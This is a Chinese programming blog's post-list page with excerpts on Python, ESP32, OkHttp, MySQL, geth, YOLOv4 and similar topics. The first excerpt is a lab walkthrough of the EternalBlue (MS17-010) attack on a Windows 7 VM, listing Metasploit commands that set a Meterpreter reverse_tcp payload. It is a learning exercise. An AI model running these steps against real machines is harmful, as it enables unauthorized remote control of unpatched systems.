<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Posts - 编程鬼谷子的博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="Posts" />
<meta property="og:description" content="编程鬼谷子的博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="https://bcguiguzi.github.io/posts/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/posts/index.xml" title="编程鬼谷子的博客">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程鬼谷子的博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程鬼谷子的博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<header class="main__header">
		<h1 class="main__title">Posts</h1>
	</header><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/297c6bbb1989a71ef26069ec53b30186/" rel="bookmark">
			网络攻防——永恒之蓝
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		永恒之蓝 1.引言2.永恒之蓝定义3.SMB协议3.windows7版本说明4.攻击实例4.1攻击者和被攻击者展示4.2详细攻击过程4.3接下来尝试攻击一下windows10 5.参考文献 1.引言 让一个不爱学习的人整天蒙英语题，听张宇的视频实在是枯燥了点，于是决定看看网安，积累积累一些有趣的玩意儿。然后，自己不是专业的，也不是为了工作，可能会查阅大佬的博文，然后把概念借鉴过来，会留下参考链接的，如果博主不同意引用直接评论我会删除的。好，引用张宇一句话：直接来吧。
2.永恒之蓝定义 永恒之蓝（Eternal Blue）爆发于2017年4月14日晚，是一种利用Windows系统的SMB协议漏洞来获取系统的最高权限，以此来控制被入侵的计算机。甚至于2017年5月12日， 不法分子通过改造“永恒之蓝”制作了wannacry程序，使全世界大范围内遭受了该程序，甚至波及到学校、大型企业、政府等机构，只能通过支付高额的赎金才能恢复出文件。不过在该程序出来不久就被微软通过打补丁修复。之后在windows7以上的版本中不再出现了。当年的攻击效果如下（找网安大佬要的图）：
3.SMB协议 SMB（Server Message Block）是一个协议服务器信息块，它是一种客户机/服务器、请求/响应协议，通过SMB协议可以在计算机间共享文件、打印机、命名管道等资源，电脑上的网上邻居就是靠SMB实现的；SMB协议工作在应用层和会话层，可以用在TCP/IP协议之上，SMB使用TCP139端口和TCP445端口。
3.windows7版本说明 我们都知道家庭版和专业版，直白点就是普通和高级，普通提供的功能有限。但是windows7里面还有一个旗舰版。其实对于专业版和旗舰版，两者只是功能上有少量差别，如果把Windows7旗舰版的BitLocker功能(BitLocker驱动器加密通过加密Windows操作系统卷上存储的所有数据可以更好地保护计算机中的数据)和35种语言之间任意切换功能去掉其实就等于是专业版。
4.攻击实例 4.1攻击者和被攻击者展示 （1）攻击机：kali
（2）靶机：windows7旗舰版
4.2详细攻击过程 （1）首先通过ifconfig和ipconfig分别查看kali和windows7的ip地址：
kali：192.168.58.132 windows7：192.168.58.134 （2）利用kali ping windows7，发现ping不通，于是关闭windows7的防火墙，再ping就能够ping通了，说明二者能够建立连接；
（3）输入如下指令打开kali数据库：
service postgresql status //查看数据库开启状态 service postgresql start //开启数据库 service postgresql status //再次查看数据库开启状态，确认开启 开启效果如下：
（4）数据库初始化：
msfdb init （5）启动msf:
msfconsole （6）搜索ms17_010漏洞（也就是永恒之蓝漏洞）：
search ms17_010 这个时候系统会展示kali中可以使用的扫描模块：
（7）选择扫描模块：
use auxiliary/scanner/smb/smb_ms17_010 （8）开始扫描：
use exploit/windows/smb/ms17_010_eternalblue （9）设置本次扫描基本配置：
//设置扫描的靶机ip set rhost 192.168.58.134 //设置携带的攻击载荷 set payload windows/x64/meterpreter/reverse_tcp //设置监听的攻击机 set lhost 192.168.58.132 （10）利用exploit进行攻击：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/297c6bbb1989a71ef26069ec53b30186/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/844e7b953aa406ef9e01b15ed6104ef3/" rel="bookmark">
			python 1-100的和的几种方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		项目 用python 计算1-100的值
print(sum(range(1,101)))#方法一 i=a=0#方法二 while i&lt;100: i+=1#自增 a+=i#i 1到100,a实际就是一个杯子 print(a) a=0#方法3 for i in range(1,101): a+=i print(a) python求1到100的和的几种方法 - 简书
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0a693391d452a42a1f3b5f74af536448/" rel="bookmark">
			ESP32 IDF 给工程新增文件夹与源文件
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录 1 背景2 原理3 方法3.1 在 PROJECT_DIR/components 中添加组件(推荐)3.2 在自定义的 EXTRA_COMPONENT_DIRS 中添加组件 1 背景 ESP32 学习已经有一段时间了，最近在写一些简单的驱动，为了方便程序的管理与后续的移植，就有将特定驱动相关的文件放在单独文件夹的需求。
2 原理 之前学习过IDF创建的工程的文件结构： esp32系列(2)：工程结构学习，从新建工程到烧写程序
- myProject/ - CMakeLists.txt - sdkconfig - components/ - component1/ - CMakeLists.txt - Kconfig - src1.c - component2/ - CMakeLists.txt - Kconfig - src1.c - include/ - component2.h - main/ - CMakeLists.txt - src1.c - src2.c - build/ 现在再深入学习一下，乐鑫官方对 components 路径的介绍：“可选的 “components” 目录中包含了项目的部分自定义组件，并不是每个项目都需要这种自定义组件，但它有助于构建可复用的代码或者导入第三方（不属于 ESP-IDF）的组件。或者，您也可以在顶层 CMakeLists.txt 中设置 EXTRA_COMPONENT_DIRS 变量以查找其他指定位置处的组件。有关详细信息，请参阅 重命名 main 组件。如果项目中源文件较多，建议将其归于组件中，而不是全部放在 “main” 中。”
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0a693391d452a42a1f3b5f74af536448/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/726e6a64a9f7f30e2646adf67ac63721/" rel="bookmark">
			SIwave仿真手册——电源完整性仿真之PDN阻抗的提取（四）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 （想不到我这个弱鸡的博主有一天也有被催更的时候，看到后台被催的消息，我慌了，赶紧写一篇把。）
文章目录 3.1 PDN阻抗的提取3.1.1手动完成PDN阻抗的提取1、创建pin group2、创建端口3、数据文件的清理和检查（参考1.3.4&amp;1.3.5）4、添加电容模型（参考2.2.1）（==这一步很重要==）5、开始仿真6、查看仿真结果 3.1.2利用向导工具完成PDN阻抗的提取1、点击图标![在这里插入图片描述](https://img-blog.csdnimg.cn/36d974339ea5449284fed32ff2d5083d.png) →弹出如下对话框2、依次确定好层叠、padstack 、电路参数、（红框中带感叹号都要确定）3、点击Configure PI Analysis→ 弹出如下对话框4其余参考3.1.1节 未完待续，更贴中。。。应粉丝要求，粗略的更一期，最近较忙，谢谢大家！ 一个完整的电源分配网络（PDN）包括：电源供电端（VRM）、去耦电容、电源平面电容、用电芯片（Sink）
对于噪声的滤除，有一些经验数据供大家参考：
VRM的去耦频率一般在100kHz以内；大容量的去耦电容在1M以内；高频瓷片电容的去耦电容在100MHz左右；电源平面构成的平板电容的去耦频率在500MHz左右，当然这个和平面结构及材料有关系；芯片封装形成的电容可达几百GHz;芯片的die电容可达几GHz 电源完整性按照频率可分为：直流分析、交流分析。
直流分析：直流压降、电流密度、过孔电流
交流分析：PDN阻抗提取。
3.1 PDN阻抗的提取 对于电源网络而言，供电引脚会有很多，如果在每个pin处都添加port，计算量太大，而且也没有必要；所以，将相同网络的pin角合并成pin group。
3.1.1手动完成PDN阻抗的提取 1、创建pin group 点击图标→弹出下列对话框：
PCB界面会出现如下变化：
2、创建端口 点击图标 →弹出如下对话框
3、数据文件的清理和检查（参考1.3.4&amp;1.3.5） 4、添加电容模型（参考2.2.1）（这一步很重要） 5、开始仿真 6、查看仿真结果 未添加电容模型的仿真结果如下：
添加电容模型后的仿真结果如下：
其实可以看到两者差别还是很大的。所以要设置PDN网络上所有电容的正确型号。
3.1.2利用向导工具完成PDN阻抗的提取 1、点击图标 →弹出如下对话框 2、依次确定好层叠、padstack 、电路参数、（红框中带感叹号都要确定） 3、点击Configure PI Analysis→ 弹出如下对话框 在Ref.Imp 中填写VRM阻抗值(VRM:据说参考选用电源芯片的datasheet，但我没有找到这一项参数，听说也可以询问厂家)
VRM: Voltage Regulator Module，指板上LDO和DC-DC等电路。在几十kHz的低频范围内，VRM主要是电阻，具有较低的阻抗
4其余参考3.1.1节 未完待续，更贴中。。。应粉丝要求，粗略的更一期，最近较忙，谢谢大家！ 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2f9b9e1380d92d3df92bb1b3d4c4e757/" rel="bookmark">
			OkHttp简单使用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		OkHttp是什么？ OkHttp是目前最为广泛使用的网络请求框架。
1.引入库 implementation "com.squareup.okhttp3:okhttp:4.9.0" 2.配置权限 &lt;uses-permission android:name="android.permission.INTERNET" /&gt; OkHttp的使用 1.Get同步请求 new Thread(new Runnable() { @Override public void run() { OkHttpClient client = new OkHttpClient.Builder().build(); Request request = new Request.Builder().url("https://www.httpbin.org/get?name=yge&amp;age=18").get().build(); Call call = client.newCall(request); try { Response response = call.execute(); Log.e("getBtn results",response.body().string()); }catch (IOException e){ e.printStackTrace(); } } }).start(); 2.Get异步请求 OkHttpClient client = new OkHttpClient.Builder().build(); Request request = new Request.Builder().url("https://www.httpbin.org/get?name=yge&amp;age=18").get().build(); Call call = client.newCall(request); call.enqueue(new Callback() { @Override public void onFailure(@NonNull Call call, @NonNull IOException e) { Log.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2f9b9e1380d92d3df92bb1b3d4c4e757/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d633b25f7e88b150e7a0d9003ca73ff9/" rel="bookmark">
			解决No module named flask的问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 被困扰了好几天了的问题，找过别的解决方法，都不太适用，还重新安装了一遍PyCharm也没有用，后来感觉可能是我的python和flask不在一个目录下的原因（我猜的）（因为我把python卸载重新安装了一遍，在d盘里开了一个python目录，把python装在这个目录下，然后pip install flask，就自动安装到了这个目录下，之后我的flask就可以正常运行了）
基础的安装或者配置我就不说了，就给大家看一下我的前后对比吧！
哈哈哈哈哈哈哈哈哈哈哈哈哈哈我真的很高兴，三四天了，我终于解决了（人已疯） 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/49eb00f40d697ffd3d65602558ef2578/" rel="bookmark">
			promise详解
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、写在前面
本文主要总结Promise的相关知识，主要分为两个部分，一个是对于Promsie的api使用。另一个是对于手写Promise。完全解决面试问题。Promise主要分为三种状态，一个是pendding,一个是fulfillled,另一个是rejected。
二、Promise api的使用
2.1、promise的then方法
//1、then中没有返回值，则会使用promise包裹undefined进行返回。 let promise = new Promise((resolve, reject) =&gt; { resolve('hhhh') }).then(res =&gt; { console.log(res) //hhhh }).then(ret =&gt; { console.log(ret) //undefined }) //2、如果直接使用return一个值，则会在外部包裹一层promise let promise = new Promise((resolve, reject) =&gt; { resolve("hhhh") }).then(res =&gt; { console.log(res) //hhhh return "next one" }).then(res =&gt; { console.log(res) //next one }) //3、如果直接return promise，则会将Promise返回的结果传递下去 let promise = new Promise((resolve, reject) =&gt; { resolve("hhhh") }).then(res =&gt; { console.log(res) //hhhh return new Promise((resolve, reject) =&gt; { resolve("
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/49eb00f40d697ffd3d65602558ef2578/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a7711603fe060f93a017bbb58f38f78f/" rel="bookmark">
			关于MySQL数据库
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		MySQL数据库 数据库的基本概念 数据库管理技术的发展阶段 什么是数据管理：对各类数据进行分类，组织，编码，存储，检索，维护。
数据管理的技术发展：
人工管理阶段：（20世纪50年代，计算机硬件还没发达，没有磁盘， 纸袋）
文件系统阶段：（20世纪50年代后期-60年代中期），出现了磁盘，高级语言，操作系统
数据库系统阶段：（20世纪60年代后期-现在），网络技术的发展，软硬件功能提升，文件系统已经远远不能满足于要求，尤其是关系型数据库。如果你想学编程，可以来小编的C/C++编程秃头俱乐部！
数据库系统的概念 什么是数据库：按照一定的规则进行存储，管理数据的仓库。
什么是数据库管理系统：操作和管理数据库的大型软件。建立、使用、维护数据库。对数据库进行统一的管理和控制。
常用的数据库管理系统：MySQL, Oralce, SQL Server , DB2
什么是关系型数据库：采用关系模型来组织数据的数据库，（关系模型可以简单的理解为二维表格模型）
什么是SQL语句 结构化查询语句， （Structure Query Language）
由IBM公司70年代设计出来的，被ISO组织纳为关系数据库的国际标准，也是目前使用最广泛的关系数据库标准语句。
MySQL的发展历史 1985年 ，由瑞典的XXX和XXX成立了一家公司，MySQL AB公司， ISAM存储引擎算法。
MySQL是一款免费开源，小型，关系型数据库。
2000年，MySQL对原来的存储引擎进行整理，命名为MyISAM
2004年，发布了4.0经典版
2005年，发布了5.0版本
2008年，被Sun公司收购
2009年，Sun公司被Oracle公司收购了
MySQL的安装和配置 下载MySQL MySQL :: Download MySQL Community Server
安装MySQL 解压 b.添加环境变量
D:\Program Files\mysql-8.0.22-winx64\bin
c.安装数据库
mysqld --initialize --console
mysqld –install (注意：一般要以管理员身份运行控制台)
net start mysql 开启MySQL服务
如果要停止MySQL服务
如果要卸载MySQL
首先：先停止MySQL服务
然后：删除服务名
再次：删除D:\Program Files\mysql-8.0.22-winx64\ 这个文件夹下所有文件：MySQL文件
最后：删除环境变量；
d.登录MySQL数据库
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a7711603fe060f93a017bbb58f38f78f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7621d10770379482981ecdea890a7827/" rel="bookmark">
			geth控制台控制
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
geth控制台控制
启动控制台：输出结果直接显示
启动控制台：控制台输出结果写入 output.log 文件，但不能连接MetaMask
退出控制台 常用命令
开始挖矿
停止挖矿
转账
问题：出现报错 password or unlock
问题：出现 invalid sender 报错，可能是你的 gensis.json 缺少了东西
问题：查看账户发现并没有成功转账出去，账户金额没有变化
外部连接 MetaMask
win10 metamask 连接 localhost 8584
win10使用 metamask 连接虚拟机 ubuntu 中的私有链
问题：--dev引发的错误：Failed to unlock developer account
问题：使用最新版本geth，当执行personal.unlockAccount()或在程序中调用personal_unlockAccount接口时，会出现：account unlock with HTTP access is forbidden异常
问题：the method net_version does not exist/is not available
查看交易记录
方法一：根据交易id查询
方法二：根据区块id查询
geth控制台控制 主机win10， 在Ubuntu中使用geth创建私有链
启动控制台：输出结果直接显示 启动私有链代码末尾，加上 console 可以在启动私有链时，启动控制台
/geth --datadir ~/桌面/geth-project/myChain --networkid 15 console 启动控制台：控制台输出结果写入 output.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7621d10770379482981ecdea890a7827/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c7cb91871f1e0edd894d58ab29c0dd3e/" rel="bookmark">
			以太坊创建私有链 go-ethereum
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
启动节点同步
同步主网区块
同步测试网络的区块
同步Ropsten测试网络的区块
同步RinkeyBy测试网络区块
搭建自己的私有链 创建genesis.json
init初始化gensis.json 启动私链
启动节点同步 同步主网区块 安装好了Geth，现在我们可以尝试运行以下它。执行下面的命令，geth就会开始同步区块，并存储在当前目录下。这里的 --syncmode fast 参数表示我们会以“快速”模式同步区块。
在这种模式下，我们指挥下载每个区块头和区块体，但不会执行验证所有的交易，直到所有区块同步完毕再去获取一个系统的状态。这样就节省了很多交易验证的时间。
geth --datadir .--syncmode fast 通常，在同步以太坊区块链时，客户端会一开始就下载并验证每个块和每个交易，也就是说可以从创世区块开始。
毫无疑问，如果我们不加 --syncmode fast参数，同步将会花费很长时间，并且具有很高的资源要求（它将需要更多的RAM，如果你没有快速存储，则需要很长时间）。
有些文章会把这个参数写成 --fast，这是以前快速同步模式的参数写法，现在已经被
--syncmode fast 取代
同步测试网络的区块 同步Ropsten测试网络的区块 geth --testnet --datadir .--syncmode fast --testnet 则个参数会告诉 geth 启动并连接到最新的测试网络，也就是 Ropsten 。测试网络的区块和交易数量会明显少于主网，所以会更快一点。但即便是用快速模式同步测试网络，也会需要几个小时的时间。
同步RinkeyBy测试网络区块 geth --Rinkeby --datadir .--syncmode fast 搭建自己的私有链 创建genesis.json 因为公共网络的区块数量太多，同步耗时太长，我们未来方便快速了解Geth,可以试着用它来搭一个只属于自己的私链
首先，我们需要创建网络的“创世（genesis）”状态，这写在一个小小的JSON文件里（例如，我们将其命名未genesis.json）:
chainId：链id，尽量不要和公链id和测试链id一致
difficulty：挖矿难度系数，2000不算大
gasLimit：一个块里面 gas 的上限要求
alloc：初始账号信息，包含一个地址和对象，表示创世区块一创建，balance里面有多少钱
balance：余额，单位是wei
{ "config": { "chainId": 15, "homesteadBlock": 0, "eip150Block": 0, "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c7cb91871f1e0edd894d58ab29c0dd3e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1ed016e7d6cda168def797a50c77e2d9/" rel="bookmark">
			java线程池案例
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		简介 线程Thread是一个重量级资源，线程的创建、启动以及销毁都是比较耗费系统资源的，同时受限于系统资源的限制，线程的数量与系统性能是一种抛物线的关系，因此对线程的管理，是一种非常好的程序设计习惯，自JDK1.5起，utils包提供了ExecutorService[ɪɡˈzɛkjətɚ]线程池的实现。通俗的将：为了避免重复的创建线程，线程池的出现可以让线程进行复用。当有工作来，就会向线程池拿一个线程，当工作完成后，并不是直接关闭线程，而是将这个线程归还给线程池供其他任务使用。
一个线程池包括以下四个基本组成部分：
1、线程池管理器（ThreadPool）：用于创建并管理线程池，包括 创建线程池，销毁线程池，添加新任务；
2、工作线程（PoolWorker）：线程池中线程，在没有任务时处于等待状态，可以循环的执行任务；
3、任务接口（Task）：每个任务必须实现的接口，以供工作线程调度任务的执行，它主要规定了任务的入口，任务执行完后的收尾工作，任务的执行状态等；
4、任务队列（taskQueue）：用于存放没有处理的任务。提供一种缓冲机制。
线程池的作用 1.重用线程池中的线程,减少因对象创建,销毁所带来的性能开销;
2.能有效的控制线程的最大并发数,提高系统资源利用率,同时避免过多的资源竞争,避免堵塞;
3.能够多线程进行简单的管理,使线程的使用简单、高效。
线程池的创建 Java里面线程池的顶级接口是Executor，通过工具类java.util.concurrent.Executors的静态方法来创建。Executors此包中所定义的 Executor、ExecutorService、ScheduledExecutorService、ThreadFactory 和 Callable 类的工厂和实用方法。
Executors工具类创建线程池 方法名功能newFixedThreadPool(int nThreads)创建固定大小的线程池newSingleThreadExecutor()创建只有一个线程的线程池newCachedThreadPool()创建一个不限线程数上限的线程池，任何提交的任务都将立即执行 newFixedThreadPool：
使用的构造方式为new ThreadPoolExecutor(var0, var0, 0L, TimeUnit.MILLISECONDS, new LinkedBlockingQueue())，设置了corePoolSize=maxPoolSize，keepAliveTime=0(此时该参数没作用)，无界队列，任务可以无限放入，当请求过多时(任务处理速度跟不上任务提交速度造成请求堆积)可能导致占用过多内存或直接导致OOM异常
newSingleThreadExector：
使用的构造方式为new ThreadPoolExecutor(1, 1, 0L, TimeUnit.MILLISECONDS, new LinkedBlockingQueue(), var0)，基本同newFixedThreadPool，但是将线程数设置为了1，单线程，弊端和newFixedThreadPool一致
newCachedThreadPool：
使用的构造方式为new ThreadPoolExecutor(0, 2147483647, 60L, TimeUnit.SECONDS, new SynchronousQueue())，corePoolSize=0，maxPoolSize为很大的数，同步移交队列，也就是说不维护常驻线程(核心线程)，每次来请求直接创建新线程来处理任务，也不使用队列缓冲，会自动回收多余线程，由于将maxPoolSize设置成Integer.MAX_VALUE，当请求很多时就可能创建过多的线程，导致资源耗尽OOM
newScheduledThreadPool：
使用的构造方式为new ThreadPoolExecutor(var1, 2147483647, 0L, TimeUnit.NANOSECONDS, new ScheduledThreadPoolExecutor.DelayedWorkQueue())，支持定时周期性执行，注意一下使用的是延迟队列，弊端同newCachedThreadPool一致
所以根据上面分析我们可以看到，FixedThreadPool和SigleThreadExecutor中之所以用LinkedBlockingQueue无界队列，是因为设置了corePoolSize=maxPoolSize，线程数无法动态扩展，于是就设置了无界阻塞队列来应对不可知的任务量；而CachedThreadPool则使用的是SynchronousQueue同步移交队列，为什么使用这个队列呢？因为CachedThreadPool设置了corePoolSize=0，maxPoolSize=Integer.MAX_VALUE，来一个任务就创建一个线程来执行任务，用不到队列来存储任务；SchduledThreadPool用的是延迟队列DelayedWorkQueue。在实际项目开发中也是推荐使用手动创建线程池的方式，而不用默认方式，关于这点在《阿里巴巴开发规范》
中是这样描述的：
ThreadPoolExecutor构造方法创建 Executors中创建线程池的快捷方法，实际上是调用了ThreadPoolExecutor的构造方法
// Java线程池的构造函数 public ThreadPoolExecutor( int corePoolSize, // 核心线程数 int maximumPoolSize, // 最大线程数 long keepAliveTime, //线程活动时间 TimeUnit unit, // 时间单位 BlockingQueue&lt;Runnable&gt; workQueue, //工作队列 ThreadFactory threadFactory, // 线程工厂 RejectedExecutionHandler handler) //拒绝策略 线程池中几个重要的参数 corePoolSize, maximumPoolSize, workQueue以及handler：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1ed016e7d6cda168def797a50c77e2d9/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9cd57149530a77d407088b28432fef6d/" rel="bookmark">
			pandas学习之一：excel转字典
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.to_dict() 函数基本语法 DataFrame.to_dict (self, orient='dict' , into= ) --- 官方文档 函数种只需要填写一个参数：orient 即可 ，但对于写入orient的不同，字典的构造方式也不同，官网一共给出了6种，并且其中一种是列表类型：
orient ='dict'，是函数默认的，转化后的字典形式：{column(列名) : {index(行名) : value(值) )}}；orient ='list' ，转化后的字典形式：{column(列名) :{[ values ](值)}};orient ='series' ，转化后的字典形式：{column(列名) : Series (values) (值)};orient ='split' ，转化后的字典形式：{'index' : [index]，‘columns' :[columns]，’data‘ : [values]};orient ='records' ，转化后是 list形式：[{column(列名) : value(值)}......{column:value}];orient ='index' ，转化后的字典形式：{index(值) : {column(列名) : value(值)}}; 备注：
1，上面中 value 代表数据表中的值，column表示列名，index 表示行名，如下图所示：
2，{ }表示字典数据类型，字典中的数据是以 {key : value} 的形式显示，是键名和键值一一对应形成的。
2，关于6种构造方式进行代码实例 六种构造方式所处理 DataFrame 数据是统一的，如下：
&gt;&gt;&gt; import pandas as pd &gt;&gt;&gt; df =pd.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9cd57149530a77d407088b28432fef6d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/528c21aaac5eb4245f2d2f5df276b5a1/" rel="bookmark">
			目标检测算法YOLOv4详解
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		YOLOv4是精度速度最优平衡, 各种调优手段是真香，本文主要从以下几个方面进行阐述：
YOLOv4介绍YOLOv4框架原理BackBone训练策略BackBone推理策略检测头训练策略检测头推理策略 1.YOLOv4介绍 YOLOV4其实是一个结合了大量前人研究技术，加以组合并进行适当创新的算法，实现了速度和精度的完美平衡。可以说有许多技巧可以提高卷积神经网络(CNN)的准确性，但是某些技巧仅适合在某些模型上运行，或者仅在某些问题上运行，或者仅在小型数据集上运行；我们来码一码这篇文章里作者都用了哪些调优手段：加权残差连接(WRC),跨阶段部分连接(CSP),跨小批量标准化(CmBN),自对抗训练(SAT),Mish激活,马赛克数据增强,CmBN,DropBlock正则化,CIoU Loss等等。经过一系列的堆料，终于实现了目前最优的实验结果：43.5％的AP(在Tesla V100上，MS COCO数据集的实时速度约为65FPS)。
YOLOv4的贡献如下:
开发了一个高效、强大的目标检测模型。它使每个人都可以使用1080 Ti或2080 TiGPU来训练一个超级快速和准确的目标探测器。验证了在检测器训练过程中，最先进的Bag-of-Freebies和Bag-of-Specials 的目标检测方法的影响。修改了最先进的方法，使其更有效，更适合于单GPU训练，包括CBN、PAN、SAM等。 总之一句话：速度差不多的精度碾压;精度差不多的速度碾压。
YOLOV4论文： https://arxiv.org/pdf/2004.10934.pdf
YOLOV4代码： https://github.com/AlexeyAB/darknet
2.YOLOv4框架原理 我们主要从通用框架，CSPDarknet53，SPP结构，PAN结构和检测头YOLOv3出发，来一起学习了解下YOLOv4框架原理。
2.1 目标检测器通用框架 目前检测器通常可以分为以下几个部分，不管是two-stage还是one-stage都可以划分为如下结构，只不过各类目标检测算法设计改进侧重在不同位置：
如上图，除了输入，一般one-stage的目标检测算法通常由提取特征的backbone，传输到检测网络的Neck部分和负责检测的Head部分。而two-stage的算法通常还包括空间预测部分。网络中常用的模块为：
Input: 图像，图像金字塔等Backbone: VGG16,Resnet-50,ResNeXt-101,Darknet53,……Neck: FPN,PANet,Bi-FPN,……Head: Dense Prediction:RPN,YOLO,SSD,RetinaNet,FCOS,……Head: Sparse Prediction:Faster RCNN,Fast RCNN,R-CNN,…… 而作为one-stage的YOLO网络主要由三个主要组件组成：
Backbone -在不同图像细粒度上聚合并形成图像特征的卷积神经网络。Neck：一系列混合和组合图像特征的网络层，并将图像特征传递到预测层。Head：对图像特征进行预测，生成边界框和并预测类别。 这里先直接上YOLOv4的整体原理图(来源网络)如下：
如上图，整体框架跟我们之前学的YOLOv3很是类似。这里先大致看下，接下来我们将逐步分析各个部分，首先，我们先看特征提取网络Backbone.
2.2 CSPDarknet53 我们前面知道在YOLOv3中，特征提取网络使用的是Darknet53，而在YOLOv4中，对Darknet53做了一点改进，借鉴了CSPNet，CSPNet全称是Cross Stage Partial Networks，也就是跨阶段局部网络。CSPNet解决了其他大型卷积神经网络框架Backbone中网络优化的梯度信息重复问题，将梯度的变化从头到尾地集成到特征图中，因此减少了模型的参数量和FLOPS数值，既保证了推理速度和准确率，又减小了模型尺寸。如下图：
CSPNet实际上是基于Densnet的思想，复制基础层的特征映射图，通过dense block发送副本到下一个阶段，从而将基础层的特征映射图分离出来。这样可以有效缓解梯度消失问题(通过非常深的网络很难去反推丢失信号) ，支持特征传播，鼓励网络重用特征，从而减少网络参数数量。CSPNet思想可以和ResNet、ResNeXt和DenseNet结合，目前主要有CSPResNext50 和CSPDarknet53两种改造Backbone网络。
考虑到几方面的平衡：输入网络分辨率/卷积层数量/参数数量/输出维度。一个模型的分类效果好不见得其检测效果就好，想要检测效果好需要以下几点：
更大的网络输入分辨率——用于检测小目标更深的网络层——能够覆盖更大面积的感受野更多的参数——更好的检测同一图像内不同size的目标 具体改进点：
&gt; 用 Concat 代替 Add，提取更丰富的特征。
之前介绍过 Concat 操作后，特征图的尺寸不变，深度会增加，而 Add 操作后尺寸和深度都不改变，从这个意义上说，用 Concat 代替 Add，就能够提取更丰富的特征。
&gt; 引入 transition layer （1 * 1conv + 2 * 2pooling），提取特征，降低计算量，提升速度。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/528c21aaac5eb4245f2d2f5df276b5a1/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7cacdc9dd0f3b825e29b798989627e7b/" rel="bookmark">
			FPGA学习-Verilog实现独立按键消抖
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 前言一、独立按键消抖原理二、按键消抖程序实现（Verilog）1.按键触发判断2.计数器模块实现3.按键状态更新4.按键控制led亮灭 三、仿真测试文件编写四、编译结果 前言 利用verilog语言实现独立按键消抖，文章首先对按键抖动产生的原因、消抖原理进行简要解释；之后详细阐述各模块verilog语言实现方法；最后利用四个独立按键控制led亮灭，在vivado下进行源码设计与仿真。（完成程序代码附在文章结尾）
